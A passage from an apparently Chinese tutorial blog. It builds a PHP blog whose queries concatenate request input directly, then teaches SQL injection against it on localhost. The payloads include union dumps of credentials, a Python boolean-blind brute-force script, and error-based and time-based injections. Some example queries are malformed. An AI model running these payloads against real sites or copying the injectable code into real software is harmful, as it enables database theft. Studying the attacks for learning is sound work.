class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;conn.php&quot;;</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line"></span><br><span class="line">$action = $_GET[&#x27;action&#x27;];</span><br><span class="line">if($action ==&quot;edit&quot;)&#123;</span><br><span class="line">    $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    $title = $_POST[&#x27;title&#x27;];</span><br><span class="line">    $content =$_POST[&#x27;content&#x27;];</span><br><span class="line"></span><br><span class="line">    $sql = &quot;update page set title = &#x27;$title&#x27;, content = &#x27;$content&#x27; where id =$id&quot;;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    if($result)&#123;</span><br><span class="line">        echo &quot;修改成功&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;修改失败&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    header(&quot;location:page_edit.php?id=$id&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    if(!isset($id))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&quot;id不存在，不能修改&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $sql = &quot;select id,title,content from page where id=$id&quot;;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    if($result)&#123;</span><br><span class="line">        $page = $result-&gt;fetch_array(MYSQLI_BOTH);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Charmersix_blog内容修改&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;h1 style=&quot;color: #0adaed&quot;&gt;Chronos内容修改&lt;/h1&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;form action=&quot;page_edit.php?action=edit&amp;id=&lt;?=$page[&#x27;id&#x27;];?&gt;&quot; enctype=&quot;application/x-www-form-urlencoded&quot; method=&quot;post&quot; &gt;</span><br><span class="line"></span><br><span class="line">        标题:&lt;input type=&quot;text&quot; name=&quot;title&quot; style=&quot;background: rgba(255,255,255,0.5);color: rgb(6,247,127);width:200px&quot; value=&quot;&lt;?=$page[&#x27;title&#x27;];?&gt;&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        内容:&lt;input type=&quot;text&quot; name=&quot;content&quot; style=&quot;background: rgba(255,255,255,0.5);color: rgb(14,229,57);width:200px;height: 250px&quot; value=&quot;&lt;?=$page[&#x27;content&#x27;];?&gt;&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;修改&quot;style=&quot;background: rgba(255,255,255,0.5);color: rgb(240,8,8)&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$conn-&gt;close();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h3 id="8-增加删除功能"><a href="#8-增加删除功能" class="headerlink" title="8 增加删除功能"></a>8 增加删除功能</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;conn.php&quot;;</span><br><span class="line"></span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">if(isset($id))&#123;</span><br><span class="line">    $sql = &quot;delete from page where id =$id&quot;;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    if($result)&#123;</span><br><span class="line">        echo &quot;删除成功&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;id不存在，无法删除&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$conn-&gt;close();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h3 id="9-增加链接，提升可用性"><a href="#9-增加链接，提升可用性" class="headerlink" title="9 增加链接，提升可用性"></a>9 增加链接，提升可用性</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;index.html&quot; style=&quot;color: tomato&quot;&gt;首页&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;page_list.php&quot; style=&quot;color: tomato&quot;&gt;文章列表&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;page_add.php&quot; style=&quot;color: tomato&quot;&gt;新增内容&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;page_logout.php&quot; style=&quot;color: tomato&quot;&gt;退出登录&lt;/a&gt;</span><br></pre></td></tr></table></figure>



<h3 id="10-设置权限"><a href="#10-设置权限" class="headerlink" title="10 设置权限"></a>10 设置权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!$_SESSION[&#x27;LOGIN&#x27;])&#123;</span><br><span class="line">    header(&quot;location:index.html&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="11-增加退出功能"><a href="#11-增加退出功能" class="headerlink" title="11 增加退出功能"></a>11 增加退出功能</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">session_destroy();</span><br><span class="line"></span><br><span class="line">header(&quot;location:index.html&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h3><p>sql语句对数据库的增删改查，一般使用</p>
<ul>
<li><code>select id,username,passw from user;</code></li>
<li><code>update page set title = &#39;page1&#39;,content=&#39;content1&#39; where id = 1;</code></li>
<li><code>delete from page where id = 1;</code></li>
<li><code>insert into page (title,content) values(&#39;page&#39;,&#39;content&#39;);</code></li>
</ul>
<h3 id="PHP语句"><a href="#PHP语句" class="headerlink" title="PHP语句"></a>PHP语句</h3><ul>
<li><p><code>conn = new mysqli()</code></p>
<p>连接数据库</p>
</li>
<li><p><code>conn-&gt;query()</code></p>
</li>
<li><p><code>result-&gt;fetch_all()</code></p>
</li>
<li><p><code>result-&gt;fetch_array()</code></p>
<p>多个用fetch_all()</p>
</li>
</ul>
<h1 id="NO-2SQL注入"><a href="#NO-2SQL注入" class="headerlink" title="NO.2SQL注入"></a>NO.2SQL注入</h1><h2 id="0x1sql注入产生"><a href="#0x1sql注入产生" class="headerlink" title="0x1sql注入产生"></a>0x1sql注入产生</h2><p>动态页面中，get或者post提交参数，这个参数进入到了sql语句进行了数据库查询</p>
<p>简言之:非可信字符直接拼接进sql语句进行数据查询,就会造成sql注入</p>
<h2 id="0x2sql注入的危害"><a href="#0x2sql注入的危害" class="headerlink" title="0x2sql注入的危害"></a>0x2sql注入的危害</h2><ul>
<li>歪曲sql语句的查询结果</li>
<li>泄露数据库中的敏感数据</li>
<li>干扰查询结果绕过权限检查</li>
<li>通过文件操作写入恶意代码</li>
</ul>
<h2 id="0x3sql注入的类型"><a href="#0x3sql注入的类型" class="headerlink" title="0x3sql注入的类型"></a>0x3sql注入的类型</h2><h3 id="1-数字型注入和union联合注入"><a href="#1-数字型注入和union联合注入" class="headerlink" title="1 数字型注入和union联合注入"></a>1 数字型注入和union联合注入</h3><h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/page_detail.php?id=1%2b2</span><br><span class="line">http://127.0.0.1/page_detail.php?id=2-1</span><br></pre></td></tr></table></figure>

<p>如果可以查询到id&#x3D;3和1的数据,就可以说明这里存在数字型注入,就可以与union联合注入相结合</p>
<h4 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h4><p>确定了是数字型注入后，我们就可以使用联合查询<code>union</code>来查询数据</p>
<p>联合查询<code>union</code>是指将两个查询的结果联合返回。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,title,content from page union select id,username,password from user;</span><br></pre></td></tr></table></figure>

<p>我们可以看到</p>
<p><img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/202210132127045.png" alt="image-20221013212734008"></p>
<p>可以看到，通过联合查询，我们将user表的查询结果合并到了page表的查询结果中，最重要的是我们看到username内容进入了返回结果的title列，password内容进入了返回结果的content列</p>
<p>同理我们回到我们网站</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/page_detail.php?id=1 union select id,username,password from user;</span><br></pre></td></tr></table></figure>

<p>很遗憾这里没有显示出我们想要的数据</p>
<p>因为在网页中这里只能显示出两条数据,我们可以加个<code>limit</code>来限制显示的哪两条数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/page_detail.php?id=1 union select id,username,password from user limit 1,1;</span><br></pre></td></tr></table></figure>

<p>表示从第二条记录开始，选择1条，第一条记录序号为0</p>
<p>就可以展现出我们想要的数据</p>
<p>根据union的规定，使用联合查询时，前后2个查询结果的列要一致，否则就无法对齐。所以前面是3个列，后面也就必须是三列，如果不足，就需要补足列数量。</p>
<p>当然我们也可以使用<code>group_concat</code>将所有的数据写入到一行输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/page_detail.php?id=1 union select 1,2,group_concat(id,username,password) from user limit 1,1;</span><br></pre></td></tr></table></figure>

<p>那么问题又来了,如果我们不知道列名,表名甚至连几列都不知道,这时候我们可以用个<code>order by</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/page_detail.php?id=1 order by 1</span><br></pre></td></tr></table></figure>

<p>从1开始增加,一直增加到4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/page_detail.php?id=1 order by 1,2,3,4</span><br></pre></td></tr></table></figure>

<p>这时候没有回显了，就可以说明我们这个数据表有三列</p>
<p>那么我们怎么得到表名呢?在我们的MySQL里边有一个数据表是专门用来存表名的,在我们的information_schema里有一个TABLES,里面存着所有表的名字,在最后我们可以找到我们数据表的名字</p>
<p>那么怎么查这个表名呢,我们可以这样</p>
<p>回到web页面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/page_detail.php?id=1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 limit 1,1</span><br></pre></td></tr></table></figure>

<p>问题继续产生,怎么查询我们的列名呢 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/page_detail.php?id=1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;user&#x27;),3 limit 1,1</span><br></pre></td></tr></table></figure>

<p>这样我们就可以拿到我们列名，就可以按照最开始的查询语句来查询我们想要的数据</p>
<p>附结构图，方便查询我们需要的表名，列名</p>
<p><img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/202210142234339.png" alt="sql"></p>
<h3 id="2-字符型注入和布尔盲注"><a href="#2-字符型注入和布尔盲注" class="headerlink" title="2 字符型注入和布尔盲注"></a>2 字符型注入和布尔盲注</h3><h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p>字符型注入和数字型注入最大的区别就是引号的包裹。 </p>
<p>字符型多了一个单引号，由</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select id,title,content from page where id=$id&quot;;</span><br></pre></td></tr></table></figure>

<p>变成</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select id,title,content from page where id = &#x27;$id&#x27;&quot;;</span><br></pre></td></tr></table></figure>

<p>它们的区别在于<img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/202210152153414.png" alt="image-20221015215335376"></p>
<p>字符串转为数字后是拿<strong>第一位</strong>来判断,如果第一位是数字,那么字符串就是数字；如果是字母,那么<code>1=a</code>显然不对,返回0。</p>
<p>字符型SQL注入重点就是要闭合单引号或者双引号</p>
<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>当我们没有明显的回显点,只能得到两种结果,比如页面报错&#x2F;页面没报错,这时候,我们可以用布尔盲注来猜</p>
<ul>
<li>当我们猜对的时候,页面没有报错</li>
<li>当我们猜错的时候,页面报错</li>
</ul>
<p>基于这个原理,我们能够通过发送大量请求,来猜出所有的数据</p>
<p>这里我们可以拿login.php来试一下,这里我们需要用一个<code>or</code>,在SQL中,<code>or</code>前后只要成立一条命令,该命令就成立;我们还需要用到一个<code>substr()</code>,用于截取对应字段的指定长度</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SUBSTR(string ,pos,len)</span><br><span class="line"></span><br><span class="line">string:指定字符串</span><br><span class="line"></span><br><span class="line">pos:规定字符串从何处开始，（这里的第一个位置是1而不是0）为正数时则从字段开始出开始，为负数则从结尾出开始。</span><br><span class="line"></span><br><span class="line">len:要截取字符串的长度。（是从1开始计数而不是0）</span><br></pre></td></tr></table></figure>

<p><img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/image-20221102205236251.png" alt="image-20221102205236251"></p>
<p>可以看出确实可以；</p>
<p><img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/image-20221102205337746.png" alt="image-20221102205337746"></p>
<p>可以判断，用户的第一位是<code>a</code>，所以我们可以挨个试从第一位开始试到最后一位</p>
<p>也可以写一个bool盲注的脚本，来猜用户名</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/Day0/SQLtest/login.php&quot;</span></span><br><span class="line"></span><br><span class="line">users = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">user = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> users:</span><br><span class="line">        data=&#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:<span class="string">&quot;123&#x27; or substr(username,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; and id = 1#&quot;</span>.<span class="built_in">format</span>(i,u),</span><br><span class="line">         <span class="comment">#这里的井号可以换成--空格,来注释掉后边的语句,有些版本也可以用--A</span></span><br><span class="line">        <span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;page_list.php&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            user += u</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在盲注第&#123;&#125;位&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;用户名为:&quot;</span>+user)</span><br></pre></td></tr></table></figure>



<h3 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3 报错注入"></a>3 报错注入</h3><p>为了解决没有回显的情况下，效率比较低的问题，我们可以尝试根据报错信息来带出数据</p>
<p>报错的信息，一定程度上也可以看作是一种通道。</p>
<h4 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a>updatexml报错</h4><p>函数updatexml(XML_document,XPath_string,new_value)包含三个函数</p>
<ul>
<li><p>第一个参数是string格式,为XML文档对象名称,例如doc</p>
</li>
<li><p>第二个参数是路径</p>
</li>
<li><p>第三个参数是替换查找符合条件的数据</p>
</li>
</ul>
<p>原理:输入错误的第二个参数,更改路径的符号,使其报错带出我们想要的数据</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=123&#x27; or updatexml(1, concat(&#x27;[&#x27;,(select user()),&#x27;]&#x27;),3)%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p><img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/image-20221103191607250.png" alt="image-20221103191607250"></p>
<p>那么问题来了,这个<code>[]</code>or<code>&#123;&#125;</code>甚至是<code>~</code>的作用是什么,根据updatexml函数可以看出,第二条数据是xpath,Xpath是一门从html中提取数据的语言,这里我们们如果不加符号,会发现无法返回想要的数据,而这些符号的作用就是选中这些区块,使他们成为一个整体,然后从HTML中显示出来</p>
<p>同理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=123&#x27; or updatexml(1, concat(&#x27;[&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=database()),&#x27;]&#x27;),3)%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p><img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/image-20221103191921354.png" alt="image-20221103191921354"></p>
<p>如果flag过长无法显示时，我们可以使用这种方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,updatexml(1,concat(&#x27;[&#x27;,right((select flag from sqli.flag),31),&#x27;]&#x27;),1)</span><br></pre></td></tr></table></figure>

<p>意思是从右边读取31位,两部分拼接起来就可以了</p>
<p>另外，还有其他函数，同样可以引发报错，通过报错信息返回数据</p>
<p><img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/image-20221103205023673.png" alt="image-20221103205023673"></p>
<p>如果有报错信息，可以根据这个表中的函数，进行测试</p>
<h4 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h4><h4 id="整数溢出报错"><a href="#整数溢出报错" class="headerlink" title="整数溢出报错"></a>整数溢出报错</h4><h4 id="exp报错"><a href="#exp报错" class="headerlink" title="exp报错"></a>exp报错</h4><p>基于一个数学函数,取e的x次方,当我们输入的值大于709就报错,适用版本:**5.5.5<code>~</code>5.5.49,**取反运算符<code>~</code>的值总会大于709</p>
<p><strong>注意:这里必须使用嵌套,因为不适用嵌套不加<code>select * from</code>无法大于整数溢出</strong></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=123&#x27; and exp(~(select*from(select group_concat(table_name)from information_schema.tables where table_schema=database())a))%23&amp;password=123</span><br></pre></td></tr></table></figure>



<h4 id="pow报错"><a href="#pow报错" class="headerlink" title="pow报错"></a>pow报错</h4><p>pow函数简介:</p>
<blockquote>
<ol>
<li>功能: 计算x的y次幂.</li>
<li>返回值: x不能为负数且y为小数, 或者x为0且y小于等于0,返回幂指数的结果</li>
<li>返回类型: double型, int,float会给予警告</li>
</ol>
</blockquote>
<p>pow(x,y)表示计算x的y次方,当计算值过大时,会发生DOUBLE溢出,数据库报错</p>
<h4 id="cot报错"><a href="#cot报错" class="headerlink" title="cot报错"></a>cot报错</h4><p>cot函数简介:</p>
<blockquote>
<p>cot函数是三角函数,cot坐标系表示: cotθ&#x3D;x&#x2F;y,在三角函数中cotθ&#x3D;cosθ&#x2F;sinθ</p>
</blockquote>
<p>x取值无限接近于0和Π的整数倍,取0或Π的整数倍报错</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username=&#x27;1&#x27; and 1=1 and cot(0);</span><br></pre></td></tr></table></figure>



<h4 id="不存在的函数报错"><a href="#不存在的函数报错" class="headerlink" title="不存在的函数报错"></a>不存在的函数报错</h4><p>直接调用不存在的函数，会显示出数据库名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> chronos();</span><br></pre></td></tr></table></figure>



<h3 id="4-堆叠注入"><a href="#4-堆叠注入" class="headerlink" title="4 堆叠注入"></a>4 堆叠注入</h3><p>如果目标开启了多语句执行的时候，可以采用多语句执行的方式修改数据库的任意结构和数据，这种特殊的注入就是堆叠注入</p>
<p>堆叠注入一般用分号<code>;</code>来分割多条语句,堆叠注入的情况下,还可以进行变量定义、定义存储过程、实现复杂语句等高级功能</p>
<p>最简单的堆叠注入如下:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>;<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> page;</span><br></pre></td></tr></table></figure>

<p>这里和联合注入的最大区别就是，这里是执行了两条语句，返回的是两个结果集。</p>
<p><img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/202210182222260.png" alt="image-20221018222217218"></p>
<p>而且堆叠注入的两条语句可以查询不同的列数,但是联合查询的列数必须是相同的。</p>
<h3 id="5-时间盲注"><a href="#5-时间盲注" class="headerlink" title="5 时间盲注"></a>5 时间盲注</h3><p>基于时间的盲注，总体的思路和布尔盲注有点类似，通过<code>sleep</code>等函数的使用，在满足猜测条件时，人工进行延时，通过延时这种信号来反映出我们猜测的结果</p>
<p>所以,在一定程度上页面发响应的时间也可以作为一种信道来使用</p>
<h4 id="基于时间延时的盲注：SLEEP"><a href="#基于时间延时的盲注：SLEEP" class="headerlink" title="基于时间延时的盲注：SLEEP"></a>基于时间延时的盲注：SLEEP</h4><p>函数sleep,使用说明:</p>
<blockquote>
<p>睡眠(暂停)时间为duration参数给定的秒数,然后返回0,若sleep()被中断,它会返回1</p>
</blockquote>
<p>当用and时</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep();</span><br></pre></td></tr></table></figure>

<p><img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/image-20221103224345963.png" alt="image-20221103224345963"></p>
<p>当用or时</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> sleep();</span><br></pre></td></tr></table></figure>

<p><img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/image-20221103224503011.png" alt="image-20221103224503011"></p>
<p>因为这里用and连接,虽然成功执行了sleep(1),但是执行sleep函数返回的是0,所以查询语句无法正确执行</p>
<p>or在匹配时会匹配所有的数据,由于这里我们不止有id&#x3D;1的数据,所以会在4.04秒后才执行完毕</p>
<h5 id="配合if条件触发"><a href="#配合if条件触发" class="headerlink" title="配合if条件触发"></a>配合if条件触发</h5><p>IF(expr1,expr2,expr3)</p>
<p>如果expr1是true(expr1&lt;&gt;0 and expr1&lt;&gt;NULL)，则IF()的返回值为expr2; 否则返回值则为expr3. IF() 的返回值为数字值或字符串值, 具体情况视其所在语句而定.</p>
<p><img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/202210192046241.png" alt="image-20221019204619155"></p>
<p>意思是查询,然后如果2&gt;1就sleep1秒,否则就替换为1</p>
<p>或者可以这么说,如果2&gt;1就返回1,否则就替换为0</p>
<p><img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/image-20221103225201229.png" alt="image-20221103225201229"></p>
<p>同理可得,配合布尔盲注</p>
<h5 id="再用上截取函数"><a href="#再用上截取函数" class="headerlink" title="再用上截取函数"></a>再用上截取函数</h5><p><code>substring()</code>和<code>substr()</code></p>
<p>SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)</p>
<p><code>substr(string,start,lenth)</code></p>
<p>参数同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度</p>
<p><code>substring_index(str,delmi,count)</code></p>
<p>说明：substring_index(被截取的字段，关键字，关键字出现的次数)</p>
<p>示例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;a&#x27;</span> <span class="keyword">or</span> if(substr((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">user</span>)))</span><br></pre></td></tr></table></figure>

<p>原理类似于mysql正则匹配：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username rlike <span class="string">&#x27;^ad&#x27;</span>;</span><br><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username regexp <span class="string">&#x27;^ad&#x27;</span>;</span><br></pre></td></tr></table></figure>



<h5 id="配合select-case-when条件触发"><a href="#配合select-case-when条件触发" class="headerlink" title="配合select case when条件触发"></a>配合select case when条件触发</h5><p>SQL CASE表达式是一种通用的条件表达式，类似于其他语言中的if&#x2F;else语句</p>
<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> username<span class="operator">=</span>&quot;admin THEN&#x27;admin &#x27; ELSE &#x27;xxx&#x27; end from user&quot;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> username<span class="operator">=</span>&quot;admin&quot; <span class="keyword">THEN</span> <span class="string">&#x27;aaa&#x27;</span> <span class="keyword">ELSE</span> (sleep(<span class="number">3</span>)) <span class="keyword">end</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure>



<h4 id="基于时间延时的盲注：逐字注入"><a href="#基于时间延时的盲注：逐字注入" class="headerlink" title="基于时间延时的盲注：逐字注入"></a>基于时间延时的盲注：逐字注入</h4><p>能够截取字符串，同时能触发延时即可</p>
